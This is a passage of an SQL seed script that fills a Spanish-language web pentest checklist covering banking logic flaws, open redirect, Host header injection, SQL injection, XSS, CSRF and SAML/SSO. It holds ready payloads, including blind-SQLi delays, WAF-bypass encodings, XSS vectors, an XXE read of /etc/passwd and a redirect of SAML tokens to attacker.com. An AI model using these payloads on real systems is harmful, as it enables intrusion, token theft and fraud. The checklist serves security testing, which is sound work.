(9, 'Deducción fiscal: Verificar alteración de parámetros para aumentar y disminuir la tasa de interés', '## Manipulación de Tasas\n\n- **Escenario:** Calculadoras de préstamos que envían la tasa desde el cliente al servidor para formalizar el contrato.', 9),

(9, 'Deducción fiscal: Verificar si el usuario A puede descargar los detalles TDS del usuario B', '## Descarga de Archivos (IDOR)\n\n- **Prueba:** `/download/tds?id=123`. Manipular ID.', 10),

(9, 'Deducción fiscal: Verificar si el usuario A puede solicitar la chequera en nombre del usuario B', '## Solicitud de Servicios\n\n- **Ataque:** Pedir chequera para la víctima (DoS físico o molestia). Si se puede cambiar la dirección de entrega, es fraude.', 11),

(9, 'Depósito fijo: Verificar si es posible que el usuario A abra una cuenta FD en nombre del usuario B', '## Creación de Recursos Cross-User\n\n- **Prueba:** Usar la sesión de A pero enviar el `customer_id` de B al crear el plazo fijo.', 12),

(9, 'Depósito fijo: Verificar si el usuario puede abrir una cuenta FD con más monto que el saldo', '## Lógica de Negocio (Saldo Insuficiente)\n\n- **Prueba:** Saldo = $100. Intentar abrir Plazo Fijo de $1000.\n- **Ataque:** Race condition (gastar el dinero en transferencia y abrir FD simultáneamente) o bypass de validación cliente.', 13),

(9, 'Detener pago: ¿Puede el usuario A detener el pago del usuario B mediante el número de cheque?', '## IDOR en Cancelaciones\n\n- **Prueba:** Detener el pago de un cheque emitiendo una orden de "Stop Payment" sobre un número de cheque que no te pertenece.', 14),

(9, 'Detener pago: ¿Puede el usuario A detener el pago basándose en un rango de fechas para el usuario B?', '## Denegación de Servicio Financiero\n\n- **Impacto:** Bloquear la operativa de una empresa o usuario cancelando sus pagos.', 15),

(9, 'Consulta de estado: ¿Puede el usuario A ver la consulta de estado del usuario B?', '## Fuga de Consultas\n\n- **Prueba:** Ver tickets de soporte o estado de trámites de otros clientes.', 16),

(9, 'Consulta de estado: ¿Puede el usuario A modificar la consulta de estado del usuario B?', '## Sabotaje\n\n- **Acción:** Cerrar tickets de soporte de otros usuarios o añadir comentarios falsos.', 17),

(9, 'Consulta de estado: ¿Puede el usuario A publicar una consulta en nombre del usuario B?', '## Suplantación de Identidad interna\n\n- **Ataque:** Enviar mensajes ofensivos al banco en nombre de la víctima.', 18),

(9, 'Transferencia de fondos: ¿Es posible transferir fondos al usuario C en lugar del usuario B?', '## Manipulación de Beneficiario (Man-in-the-Browser)\n\n\n\n- **Flujo:** El usuario autoriza pago a B. Atacante intercepta y cambia `dest_account` a C.\n- **Defensa:** Firma de transacción dinámica (2FA que incluye cuenta y monto).', 19),

(9, 'Transferencia de fondos: ¿Puede manipularse el monto de la transferencia de fondos?', '## Manipulación de Monto\n\n- **Prueba:** Cambiar monto a negativo (`-1000`).\n- **Prueba:** Decimales extraños (`0.000001`).\n- **Prueba:** Desbordamiento de enteros (Integer Overflow).', 20),

(9, 'Transferencia de fondos: ¿Puede el usuario A modificar la lista de beneficiarios del usuario B?', '## Inyección de Beneficiarios\n\n- **Ataque:** Añadir la cuenta del atacante a la lista de "Beneficiarios de Confianza" de la víctima mediante IDOR en el endpoint `/payee/add`.', 21),

(9, 'Transferencia de fondos: ¿Es posible agregar beneficiario sin ninguna validación adecuada?', '## Bypass de Validaciones\n\n- **Riesgo:** Si el banco requiere OTP para añadir beneficiario, intentar saltarlo manipulando la respuesta del servidor.', 22),

(9, 'Transferencia programada: ¿Puede el usuario A ver la transferencia programada del usuario B?', '## Espionaje de Pagos Futuros\n\n- **Impacto:** Conocer la nómina, pago de alquileres, etc.', 23),

(9, 'Transferencia programada: ¿Puede el usuario A cambiar los detalles de la transferencia programada del usuario B?', '## Secuestro de Transferencias Programadas\n\n- **Ataque:** Modificar una transferencia recurrente legítima para que el dinero vaya a la cuenta del atacante.', 24),

(9, 'NEFT: Manipulación de monto a través de transferencia NEFT', '## Lógica Específica de Protocolo\n\n- **NEFT/SEPA/SWIFT:** A veces tienen validaciones distintas a las transferencias internas. Probar límites máximos y mínimos.', 25),

(9, 'NEFT: Verificar si el usuario A puede ver los detalles de transferencia NEFT del usuario B', '## Logs de Transferencia\n\n- **Prueba:** IDOR en recibos de transferencia.', 26),

(9, 'Pago de facturas: Verificar si el usuario puede registrar beneficiario sin aprobación del verificador', '## Control Dual\n\n- **Empresas:** Verificar si un usuario "Maker" puede aprobar sus propios pagos sin un usuario "Checker".', 27),

(9, 'Pago de facturas: Verificar si el usuario A puede ver los pagos pendientes del usuario B', '## Privacidad\n\n- **Prueba:** Ver facturas de luz/agua pendientes de otros usuarios.', 28),

(9, 'Pago de facturas: Verificar si el usuario A puede ver los detalles de pago realizados del usuario B', '## Historial de Pagos\n\n- **Prueba:** Acceder a recibos históricos.', 29);

-- ==========================================
-- CATEGORÍA: Pruebas de Redirección Abierta (ID 10)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(10, 'Usar opción de búsqueda de Burp para encontrar parámetros como URL, red, redirect, redir, origin', '## Identificación de Parámetros\n\nLos desarrolladores suelen usar nombres predecibles para redirecciones.\n\n- **Lista común:** `next`, `url`, `target`, `r`, `dest`, `destination`, `redir`, `redirect_uri`, `return_to`, `out`.\n- **Acción:** Usa "Grep" en Burp Suite o herramientas como `ParamMiner` para descubrirlos.', 1),

(10, 'Verificar el valor de estos parámetros que pueden contener una URL', '## Análisis de Valores\n\n- **Observación:** Si ves `?next=/home`, es una redirección relativa. Si ves `?next=http://google.com`, es absoluta.\n- **Prueba:** Decodifica el valor (URL Decode) para ver si hay URLs camufladas.', 2),

(10, 'Cambiar el valor de la URL y verificar si se redirige', '## Prueba Básica\n\n- **Payload:** `?next=http://attacker.com`\n- **Verificación:** Revisa si la respuesta es `301/302` y el header `Location: http://attacker.com`.\n- **Impacto:** Phishing altamente efectivo (la víctima confía en el dominio original).', 3),

(10, 'Probar barra simple y codificación de URL', '## Evasión de Filtros Básicos\n\n- **Técnica:** Si bloquean `http://`, prueba sin protocolo.\n- **Payloads:**\n  - `?url=/attacker.com` (A veces interpretado como relativo al root, a veces como protocolo agnóstico)\n  - `?url=%68%74%74%70%3a%2f%2fattacker.com` (Full URL Encoding).', 4),

(10, 'Usar un dominio o palabra clave de la lista blanca', '## Bypass de Whitelist\n\n- **Escenario:** El servidor solo permite redirecciones si contienen "google.com".\n- **Payloads:**\n  - `google.com.attacker.com` (Subdominio)\n  - `attacker.com/google.com` (Path)\n  - `attacker.com?q=google.com` (Query param).', 5),

(10, 'Usar // para eludir la palabra clave http de lista negra', '## Protocol Relative URL\n\n- **Concepto:** Los navegadores interpretan `//` como "usa el mismo protocolo que la página actual".\n- **Payload:** `?url=//attacker.com`.\n- **Resultado:** Redirige a `https://attacker.com` si la víctima está en HTTPS.', 6),

(10, 'Usar https: para eludir la palabra clave // de lista negra', '## Variaciones de Protocolo\n\n- **Payload:** `?url=https:attacker.com` (Nota la falta de `//`).\n- **Comportamiento:** Firefox y Chrome a veces corrigen esto y redirigen correctamente.', 7),

(10, 'Usar \\\\ para eludir la palabra clave // de lista negra', '## Normalización de Barras\n\n- **Payload:** `?url=\\/\\/attacker.com` o `?url=\\\\attacker.com`.\n- **Teoría:** Algunos frameworks backend normalizan las barras invertidas a barras normales antes de procesar, pero el filtro de seguridad (WAF) no lo detecta.', 8),

(10, 'Usar \\/\\/ para eludir la palabra clave // de lista negra', '## Ofuscación Mixta\n\n- **Payload:** `?url=\\/\\/attacker.com`.\n- **Objetivo:** Confundir expresiones regulares mal construidas que buscan `//` estricto.', 9),

(10, 'Usar byte nulo %00 para eludir filtro de lista negra', '## Truncamiento de Cadenas\n\n- **Payload:** `?url=http://attacker.com%00http://trusted.com`.\n- **Teoría:** El filtro lee hasta el final ("contiene trusted.com" -> OK). La redirección lee hasta el `%00` ("attacker.com").', 10),

(10, 'Usar símbolo ° para eludir', '## Unicode Normalization\n\n- **Payload:** `?url=https://google.com°@attacker.com`.\n- **Explicación:** El símbolo `°` a veces es ignorado o transformado por el navegador o backend, convirtiendo la URL en `google.com@attacker.com` (donde google.com es el usuario y attacker.com el dominio real).', 11);

-- ==========================================
-- CATEGORY: Host Header Injection (ID 11)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(11, 'Proporcionar un encabezado Host arbitrario', '## Manipulación Básica\n\n- **Prueba:** Intercepta la petición. Cambia `Host: target.com` a `Host: attacker.com`.\n- **Check:** Si la respuesta devuelve un `302 Found` con `Location: http://attacker.com/...` o genera links en el HTML apuntando a tu dominio, es vulnerable.\n- **Impacto:** Cache Poisoning, Password Reset Poisoning.', 1),

(11, 'Verificar validación defectuosa', '## Puertos No Estándar\n\n- **Prueba:** `Host: target.com:bad-port`.\n- **Fallo:** Si el servidor devuelve un error revelando configuración interna o permite la inyección de caracteres no numéricos.', 2),

(11, 'Enviar solicitudes ambiguas: Inyectar encabezados Host duplicados', '## Confusión del Servidor\n\n- **Payload:**\n  ```\n  GET / HTTP/1.1\n  Host: target.com\n  Host: attacker.com\n  ```\n- **Objetivo:** Ver cuál de los dos toma el servidor (el primero o el último). Si el WAF revisa el primero pero el servidor usa el último, hay bypass.', 3),

(11, 'Enviar solicitudes ambiguas: Proporcionar una URL absoluta', '## Absolute URI vs Host Header\n\n- **Payload:** `GET http://target.com/ HTTP/1.1` con `Host: attacker.com`.\n- **RFC:** El RFC dice que la URL absoluta tiene preferencia, pero muchos servidores la ignoran y usan el Host header para generar enlaces.', 4),

(11, 'Enviar solicitudes ambiguas: Agregar ajuste de línea', '## Indentación Maliciosa\n\n- **Payload:**\n  ```\n  GET / HTTP/1.1\n   Host: attacker.com\n  Host: target.com\n  ```\n- **Objetivo:** Algunos servidores interpretan la línea indentada como parte del header anterior, otros como un nuevo header.', 5),

(11, 'Inyectar encabezados de anulación de host', '## Headers Alternativos\n\n- **Lista:** Prueba inyectar estos headers manteniendo el Host original intacto:\n  - `X-Forwarded-Host: attacker.com`\n  - `X-Host: attacker.com`\n  - `X-Forwarded-Server: attacker.com`\n- **Resultado:** Muchos frameworks (Django, Rails) usan estos headers para construir enlaces absolutos.', 6);

-- ==========================================
-- CATEGORÍA: Pruebas de Inyección SQL (ID 12)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(12, 'Detección de punto de entrada: Caracteres simples', '## Fuzzing Básico\n\nIdentifica errores de sintaxis rompiendo la query.\n\n- **Caracteres:** `''` (Comilla simple), `"` (Doble), `;` (Punto y coma), `)` (Paréntesis de cierre).\n- **Indicador:** Error 500, mensajes explícitos ("Syntax error near..."), o desaparición parcial de contenido en la respuesta.', 1),

(12, 'Detección de punto de entrada: Codificación múltiple', '## Evasión de Filtros de Entrada\n\n- **Técnica:** Double URL Encode (`%2527`), Hex Encoding (`0x27`), Unicode Variations.\n- **Objetivo:** El WAF decodifica una vez (viendo caracteres seguros), pero la aplicación decodifica de nuevo entregando el payload malicioso a la DB.', 2),

(12, 'Detección de punto de entrada: Fusión de caracteres', '## Concatenación de Strings\n\nConfirma la inyección uniendo cadenas.\n\n- **MySQL:** `id=1 CONCAT(char(65))`\n- **MSSQL:** `id=1+''A''`\n- **Oracle/Postgres:** `id=1||''A''`\n- **Resultado:** Si devuelve "1A" o no da error, la inyección es exitosa.', 3),

(12, 'Detección de punto de entrada: Pruebas de lógica', '## Inyección Booleana (Blind)\n\n\n\nPrueba condiciones verdaderas y falsas.\n\n- **True:** `id=1 AND 1=1` (La página carga normal).\n- **False:** `id=1 AND 1=0` (La página carga vacía o falta contenido).\n- **Conclusión:** Si el comportamiento difiere, el backend está evaluando tu lógica.', 4),

(12, 'Detección de punto de entrada: Caracteres extraños', '## Caracteres Límite\n\n- **Caracteres:** Barra invertida `\\`, Byte Nulo `%00`, caracteres multibyte.\n- **Objetivo:** Causar errores de truncamiento o encoding que expongan la estructura de la consulta.', 5),

(12, 'Ejecutar escáner de inyección SQL en todas las solicitudes', '## Automatización\n\n- **Herramientas:** `SQLMap`, `Burp Scanner`, `Ghauri`.\n- **Comando Básico:** `sqlmap -u "http://target.com?id=1" --batch --dbs`.\n- **Riesgo:** Alto ruido en logs. Úsalo con precaución en producción.', 6),

(12, 'Eludir WAF: Usar byte nulo antes de la consulta SQL', '## Confusión del WAF\n\n- **Payload:** `id=1 %00 '' OR 1=1`.\n- **Teoría:** Algunos WAFs escritos en C dejan de leer tras el null byte, pero la aplicación (PHP/Java) pasa la cadena completa a la base de datos.', 7),

(12, 'Eludir WAF: Usar secuencia de comentarios SQL en línea', '## Fragmentación de Keywords\n\n- **Payload:** `UN/**/ION SE/**/LECT`.\n- **Objetivo:** Romper la firma del WAF que busca la palabra "UNION" seguida de un espacio, reemplazando el espacio por comentarios de bloque C-Style.', 8),

(12, 'Eludir WAF: Codificación URL', '## Ofuscación Estándar\n\n- **Prueba:** Codificar todo el payload.\n- **Payload:** `%55NION %53ELECT`.\n- **Variante:** IBM DB2 a veces permite `%` entre letras para ofuscación.', 9),

(12, 'Eludir WAF: Cambiar mayúsculas/minúsculas', '## Filtros Case-Sensitive\n\n- **Payload:** `SeLeCt * FrOm users`.\n- **Efectividad:** SQL es case-insensitive por estándar, pero algunos filtros regex antiguos (`/SELECT/`) solo buscan mayúsculas.', 10),

(12, 'Eludir WAF: Usar scripts de manipulación de SQLMAP', '## Scripts de Evasión\n\n- **Comando:** `sqlmap ... --tamper=space2comment,between,randomcase`.\n- **Función:** Modifican el payload automáticamente (e.g., cambia espacios por `+`, `/**/` o `%09`) para evadir reglas específicas.', 11),

(12, 'Retardos de tiempo: Oracle dbms_pipe.receive_message', '## Oracle Time-Based Blind\n\n\n\n- **Payload:** `'' OR dbms_pipe.receive_message((''a''),10)--`\n- **Efecto:** Pausa la ejecución de la query por 10 segundos exactamente en bases Oracle.', 12),

(12, 'Retardos de tiempo: Microsoft WAITFOR DELAY', '## MSSQL Time-Based Blind\n\n- **Payload:** `'' WAITFOR DELAY ''0:0:10''--`\n- **Efecto:** Pausa el hilo por 10 segundos en SQL Server.', 13),

(12, 'Retardos de tiempo: PostgreSQL pg_sleep', '## Postgres Time-Based Blind\n\n- **Payload:** `'' || pg_sleep(10)--` o `; SELECT pg_sleep(10)--`\n- **Efecto:** Muy efectivo en inyecciones "Stacked Queries". Duerme el proceso 10 segundos.', 14),

(12, 'Retardos de tiempo: MySQL sleep', '## MySQL Time-Based Blind\n\n- **Payload:** `'' AND SLEEP(10)--` o `'' OR SLEEP(10)--`\n- **Advertencia:** Si la tabla tiene 100 filas y usas WHERE, podría dormir 100 x 10 segundos (DoS).', 15),

(12, 'Retardos condicionales: Oracle', '## Inferencia Lógica (Oracle)\n\n- **Payload:** `CASE WHEN (SELECT count(*) FROM users) > 0 THEN dbms_pipe.receive_message((''a''),10) ELSE NULL END`\n- **Uso:** Si tarda 10s, la condición es verdadera (existen usuarios).', 16),

(12, 'Retardos condicionales: Microsoft', '## Inferencia Lógica (MSSQL)\n\n- **Payload:** `IF (1=1) WAITFOR DELAY ''0:0:10''`\n- **Uso:** Extraer datos carácter por carácter basándose en el tiempo de respuesta.', 17),

(12, 'Retardos condicionales: PostgreSQL', '## Inferencia Lógica (Postgres)\n\n- **Payload:** `CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END`\n- **Uso:** Confirmar inyecciones ciegas donde no se ven errores ni output.', 18),

(12, 'Retardos condicionales: MySQL', '## Inferencia Lógica (MySQL)\n\n- **Payload:** `IF(1=1, SLEEP(10), 0)`\n- **Uso:** La forma más común de extraer datos en Blind SQLi en MySQL.', 19);

-- ==========================================
-- CATEGORÍA: Pruebas de Cross-Site Scripting (ID 13)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(13, 'Probar XSS usando la herramienta QuickXSS de theinfosecguy', '## Automatización Rápida\n\n- **Uso:** Herramienta para probar múltiples payloads en inputs reflejados.\n- **Objetivo:** Identificar qué caracteres especiales (`<`, `>`, `''''`, `"`) no están siendo filtrados por el backend.\n- **Nota:** `''''` representa la comilla simple.', 1),

(13, 'Cargar archivo usando payload img src=x onerror=alert', '## Reflected XSS (HTML Context)\n\n\n\n- **Payload:** `<img src=x onerror=alert(document.domain)>`\n- **Mecanismo:** El navegador intenta cargar la imagen "x". Al fallar, ejecuta el evento `onerror`.\n- **Contexto:** Funciona si el input se refleja dentro del HTML pero fuera de un atributo.', 2),

(13, 'Si las etiquetas script están prohibidas, usar <h1> y otras etiquetas HTML', '## Dangling Markup / Event Injection\n\n- **Escenario:** El WAF bloquea `<script>`.\n- **Prueba:** Inyecta HTML válido como `<h1>test</h1>`.\n- **Escalada:** Si se renderiza, prueba eventos en etiquetas permitidas: `<body onload=alert(1)>` o `<svg/onload=alert(1)>`.', 3),

(13, 'Si la salida se refleja dentro de JavaScript usar alert(1)', '## Break out of JS Context\n\n\n\n- **Contexto:** `<script>var user = "INPUT";</script>`\n- **Payload:** `"; alert(1); //`\n- **Resultado:** `<script>var user = ""; alert(1); //";</script>`\n- **Explicación:** Cierras la cadena, cierras la sentencia, inyectas código y comentas el resto.', 4),

(13, 'Si " están filtrados entonces usar payload img src=d onerror=confirm', '## Atributos Sin Comillas\n\n- **Payload:** `<img src=x onerror=confirm(1)>` o `alert(/XSS/)`.\n- **Técnica:** HTML5 es permisivo. Los navegadores modernos permiten atributos sin comillas si no contienen espacios. `confirm()` es útil si `alert()` está bloqueado.', 5),

(13, 'Cargar un JavaScript usando archivo de imagen', '## Stored XSS via SVG\n\n\n\n- **Vector:** Subida de archivos (File Upload).\n- **Payload:** Crea un archivo `.svg` con: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`.\n- **Ejecución:** Si la aplicación muestra la imagen directamente (sin Content-Disposition: attachment), el JS se ejecuta.', 6),

(13, 'Una forma inusual de ejecutar payload JS es cambiar el método de POST a GET', '## Evasión de WAF por Verbo HTTP\n\n- **Técnica:** Si el ataque es bloqueado en una petición POST.\n- **Acción:** Cambia el método a GET (o incluso HEAD/PUT en algunas APIs mal configuradas).\n- **Fallo:** A veces las reglas del WAF solo están aplicadas al cuerpo del POST y no a la URL.', 7),

(13, 'Valor de atributo de etiqueta: La entrada aterrizó en etiqueta input', '## Salir del Atributo\n\n- **Contexto:** `<input value="USER_INPUT">`\n- **Payload:** `" onmouseover="alert(1)`\n- **Inyección:** Convierte el input de datos en un evento ejecutable (`onmouseover`, `onclick`, `onfocus`).', 8),

(13, 'Valor de atributo de etiqueta: Payload para insertar con onfocus', '## Autofocus XSS\n\n- **Payload:** `" autofocus onfocus="alert(1)`\n- **Ventaja:** No requiere interacción del usuario. El navegador pone el foco automáticamente en el input al cargar la página, disparando el evento.', 9),

(13, 'Valor de atributo de etiqueta: Payload de codificación de sintaxis', '## HTML Entity Encoding\n\n- **Payload:** `jav&#x61;script:alert(1)` (en un href).\n- **Contexto:** Funciona dentro de atributos que esperan URLs como `href` o `src`. El navegador decodifica la entidad antes de procesar el protocolo.', 10),

(13, 'Evasión de filtro XSS: < y > pueden reemplazarse con entidades HTML', '## Doble Decodificación\n\n- **Payload:** `&lt;script&gt;alert(1)&lt;/script&gt;`\n- **Condición:** Solo funciona si el backend decodifica explícitamente las entidades HTML antes de reflejarlas en la página (Error de lógica).', 11),

(13, 'Evasión de filtro XSS: Probar un políglota XSS', '## Polyglot Injection\n\n\n\n- **Concepto:** Una cadena compleja diseñada para "escapar" de múltiples contextos a la vez (Atributo, Script, HTML).\n- **Uso:** Copia payloads de la lista "OWASP Polyglot" o "Seclists". Son útiles para escaneos ciegos.', 12),

(13, 'Eludir firewall XSS: Verificar si el firewall bloquea solo minúsculas', '## Case Sensitivity Bypass\n\n- **Payload:** `<ScRiPt>alert(1)</sCrIpT>` o `<ImG SrC=x OnErRoR=alert(1)>`.\n- **Fallo:** Regex mal construidos que buscan `[a-z]` en lugar de `[a-zA-Z]`.', 13),

(13, 'Eludir firewall XSS: Intentar romper regex del firewall con nueva línea', '## Multiline Bypass\n\n- **Payload:** `<img src=x \\n onerror=alert(1)>`.\n- **Teoría:** En expresiones regulares, el punto `.` a menudo no coincide con saltos de línea (`\\n`), permitiendo que el payload pase el filtro.', 14),

(13, 'Eludir firewall XSS: Probar codificación doble', '## Codificación Anidada\n\n- **Payload:** `%253Cscript%253Ealert(1)%253C%252Fscript%253E`\n- **Proceso:** El WAF decodifica `%25` a `%`. El backend recibe `%3C` y lo decodifica a `<`.', 15),

(13, 'Eludir firewall XSS: Probar filtros recursivos', '## Filtros No Recursivos\n\n- **Mecanismo:** El filtro busca `script` y lo elimina.\n- **Payload:** `<scrscriptipt>alert(1)</scrscriptipt>`.\n- **Resultado:** Al eliminar el `script` central, las partes restantes (`scr` + `ipt`) se unen, reconstruyendo la etiqueta maliciosa.', 16),

(13, 'Eludir firewall XSS: Inyectar etiqueta de ancla sin espacios en blanco', '## XSS Sin Espacios\n\n- **Payload:** `<a/href="javascript:alert(1)">Click</a>`\n- **Nota:** La barra `/` es un separador válido en HTML entre el nombre de la etiqueta y sus atributos.', 17),

(13, 'Eludir firewall XSS: Intentar eludir espacios en blanco usando viñeta', '## Separadores Alternativos\n\n- **Payload:** `<svg•onload=alert(1)>`\n- **Técnica:** Usar caracteres ASCII/Unicode raros (como bullets, tabuladores verticales, form feeds) que el navegador interpreta como espacio pero el WAF no.', 18),

(13, 'Eludir firewall XSS: Intentar cambiar el método de solicitud', '## Evasión de Método (Revisión)\n\n- **Estrategia:** Similar al item 7. Verifica si `PUT`, `DELETE` o `PATCH` son aceptados y si el WAF inspecciona los payloads en esos verbos.', 19);

-- ==========================================
-- CATEGORÍA: Pruebas de CSRF (ID 14)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(14, 'Token anti-CSRF: Eliminar el token anti-CSRF', '## Validación de Existencia\n\n- **Prueba:** Intercepta la petición y elimina completamente el parámetro `csrf_token` (del body o query).\n- **Fallo:** El backend verifica el token *si está presente*, pero si falta, asume que es una petición segura y la procesa.', 1),

(14, 'Token anti-CSRF: Alterar el token anti-CSRF', '## Validación de Integridad\n\n- **Prueba:** Cambia el último carácter del token.\n- **Fallo:** Verifica si el servidor valida criptográficamente el token o solo comprueba que tenga la longitud o formato correcto.', 2),

(14, 'Token anti-CSRF: Usar el token anti-CSRF del atacante', '## Token Swapping (Falta de Session Binding)\n\n- **Prueba:** Genera un token válido con tu cuenta de atacante. Úsalo en la petición CSRF enviada a la víctima.\n- **Fallo:** El servidor acepta cualquier token válido generado por el sistema, sin comprobar si pertenece a la sesión del usuario actual.', 3),

(14, 'Token anti-CSRF: Falsificar el token anti-CSRF', '## Tokens Débiles\n\n- **Análisis:** Revisa si el token es predecible (e.g., MD5 del UserID, Base64 del timestamp o simplemente el SessionID repetido).\n- **Ataque:** Si puedes deducir el algoritmo, puedes falsificar tokens para cualquier usuario.', 4),

(14, 'Token anti-CSRF: Usar tokens anti-CSRF adivinables', '## Entropía Baja\n\n- **Prueba:** Captura varios tokens y analiza si son secuenciales o tienen patrones fijos. Deben ser aleatorios criptográficamente seguros.', 5),

(14, 'Token anti-CSRF: Robar tokens anti-CSRF', '## Fuga de Tokens\n\n- **Vectores:**\n  - **XSS:** Lectura del DOM para robar el token.\n  - **Referer:** Si el token va en la URL GET, se filtra en el header Referer a sitios externos.\n  - **CSS Injection:** Exfiltración del valor del input hidden.', 6),

(14, 'Cookie de doble envío: Verificar fijación de sesión en subdominios', '## Cookie Forcing\n\n- **Técnica:** Si controlas un subdominio (o tienes XSS en él), puedes establecer una cookie `csrf` en el dominio padre y luego enviar el mismo valor en el body de la petición CSRF.', 7),

(14, 'Cookie de doble envío: Ataque man in the middle', '## HTTP Downgrade\n\n- **Escenario:** El mecanismo "Double Submit" confía en que `Cookie == BodyParam`. Si la cookie no tiene el flag `Secure`, un atacante MITM puede sobrescribirla via HTTP para que coincida con su payload.', 8),

(14, 'Validación de Referrer/Origin: Restringir el POC de CSRF para no enviar encabezado Referrer', '## Bypass de Validación de Origen\n\n- **Prueba:** Si el sitio bloquea orígenes externos, intenta enviar la petición sin header Referer.\n- **Payload:** `<meta name="referrer" content="no-referrer">` en tu página maliciosa.', 9),

(14, 'Validación de Referrer/Origin: Eludir mecanismo de lista blanca/negra', '## Evasión de Regex\n\n- **Objetivo:** Engañar al filtro que busca `target.com`.\n- **Payloads:**\n  - `target.com.attacker.com`\n  - `attacker.com/target.com`\n  - `attacker.com?q=target.com`', 10),

(14, 'Formato JSON/XML: Usando formulario HTML normal1', '## Content-Type Spoofing\n\n- **Truco:** Enviar un formulario HTML normal a un endpoint JSON.\n- **Payload:** `<input name=''{"param":"value", "ignore":"'' value=''"}'' type=''hidden''>`.\n- **Resultado:** El backend recibe `{"param":"val", "ignore":"=..."}` y a veces lo parsea como JSON válido.', 11),

(14, 'Formato JSON/XML: Usando formulario HTML normal2 (Fetch Request)', '## Uso de API Fetch\n\n- **Nota:** Fetch no envía cookies cross-origin salvo que sea un "Simple Request".\n- **Prueba:** Usar `text/plain` en lugar de `application/json` si el backend lo permite.', 12),

(14, 'Formato JSON/XML: Usando solicitud XMLHTTP/AJAX', '## CORS Misconfiguration\n\n- **Requisito:** Para hacer CSRF con JSON real y headers custom, necesitas que el sitio víctima tenga una política CORS insegura (`Access-Control-Allow-Origin: *` o reflejado con `Credentials: true`).', 13),

(14, 'Formato JSON/XML: Usando archivo Flash', '## Flash CSRF (Legacy)\n\n- **Nota:** Obsoleto. Solo relevante en entornos legacy muy antiguos con archivos `crossdomain.xml` permisivos.', 14),

(14, 'Cookie Samesite: Eludir SameSite Lax mediante anulación de método', '## Método GET\n\n- **Concepto:** `SameSite=Lax` permite enviar cookies en navegaciones Top-Level (enlaces, GET).\n- **Ataque:** Si el endpoint sensible acepta GET (o `_method=GET`), puedes hacer CSRF aunque tenga Lax.', 15),

(14, 'Cookie Samesite: Eludir SameSite Strict mediante redirección del lado del cliente', '## Gadgets de Redirección\n\n\n\n- **Flujo:** Usa un Open Redirect en el sitio víctima. Al redirigir internamente al endpoint sensible, el navegador considera que la petición viene del mismo sitio y envía la cookie Strict.', 16),

(14, 'Cookie Samesite: Eludir SameSite Strict mediante dominio hermano', '## Dominios Hermanos\n\n- **Ataque:** Si tienes XSS en `blog.site.com`, puedes hacer peticiones a `app.site.com` (mismo eTLD+1) saltando la restricción Strict.', 17),

(14, 'Cookie Samesite: Eludir SameSite Lax mediante actualización de cookie', '## Ventana Temporal\n\n- **Teoría:** Algunos navegadores antiguos permitían un periodo de gracia (2 min) tras setear la cookie donde Lax se comportaba como None.', 18);

-- ==========================================
-- CATEGORÍA: Vulnerabilidades SSO (ID 15)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(15, 'Si internal.company.com te redirige a SSO, hacer FUZZ en Internal', '## Descubrimiento de Apps Internas\n\n- **Escenario:** El subdominio redirige al login SSO.\n- **Acción:** Fuzzear rutas (`/admin`, `/status`, `/api`) antes de la redirección. A veces las reglas de reescritura fallan en ciertas rutas.', 1),

(15, 'Si company.com/internal redirige a SSO, probar company.com/public/internal', '## Bypass de Reglas de Proxy\n\n- **Técnica:** URL Path Confusion.\n- **Payloads:**\n  - `/internal/./`\n  - `/public/..;/internal`\n  - `/%2e/internal`\n- **Objetivo:** Confundir al Reverse Proxy para acceder al recurso sin triggerar el SSO.', 2),

(15, 'Intentar crear solicitud SAML con token y enviarla al servidor', '## SAML Replay / Injection\n\n- **Prueba:** Captura un `SAMLResponse` válido. Intenta reenviarlo más tarde (Replay) o modificarlo si no está firmado.', 3),

(15, 'Si hay AssertionConsumerServiceURL intentar insertar tu dominio', '## Robo de Tokens SAML\n\n- **Parámetro:** Busca `AssertionConsumerServiceURL` o `ACSUrl` en la petición de login.\n- **Ataque:** Cambia la URL a `attacker.com`. Si el IdP lo permite, enviará el token de autenticación a tu servidor.', 4),

(15, 'Si hay AssertionConsumerServiceURL intentar hacer FUZZ en el valor', '## Open Redirect en SSO\n\n- **Prueba:** Si no puedes robar el token, intenta al menos conseguir una redirección abierta usando el parámetro `RelayState` o el ACS.', 5),

(15, 'Si hay algún UUID, intentar cambiarlo al UUID de la víctima', '## IDOR en SSO\n\n- **Contexto:** En el flujo OAuth/SAML, a veces se pasa un ID de usuario.\n- **Ataque:** Cámbialo por el de la víctima para ver si el proveedor de identidad te loguea como ella.', 6),

(15, 'Intentar descubrir si el servidor es vulnerable a XML Signature Wrapping', '## XML Signature Wrapping (XSW)\n\n\n\n- **Concepto:** El servidor verifica la firma de un bloque XML, pero la aplicación lee otro bloque (inyectado) con datos falsos.\n- **Herramienta:** SAML Raider (Extensión de Burp).', 7),

(15, 'Intentar descubrir si el servidor verifica la identidad del firmante', '## Validación de Certificado\n\n- **Prueba:** Firma la aserción SAML con tu propio certificado autofirmado.\n- **Fallo:** Si el servidor acepta cualquier firma válida (sin verificar la cadena de confianza), puedes falsificar cualquier identidad.', 8),

(15, 'Intentar inyectar cargas XXE en la parte superior de la respuesta SAML', '## XXE en SAML\n\n- **Vector:** Las aserciones SAML son XML en Base64.\n- **Payload:** Inyecta `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` antes del nodo raíz y referencia `&xxe;` en un atributo.', 9),

(15, 'Intentar inyectar cargas XSLT en el elemento Transforms', '## Inyección XSLT\n\n- **Vector:** Dentro de `<ds:Transforms>` en la firma XML.\n- **Impacto:** Ejecución remota de código o lectura de archivos si el motor XML procesa transformaciones maliciosas.', 10),

(15, 'Si la víctima puede aceptar tokens emitidos por el mismo proveedor de identidad', '## Confusión de Audiencia\n\n- **Escenario:** App A y App B usan el mismo IdP (e.g., Google).\n- **Ataque:** Obtén un token válido para "Tu App Maliciosa". Envíalo a "App Víctima".\n- **Fallo:** Si la App Víctima no verifica el campo `aud` (Audiencia), aceptará el token.', 11),

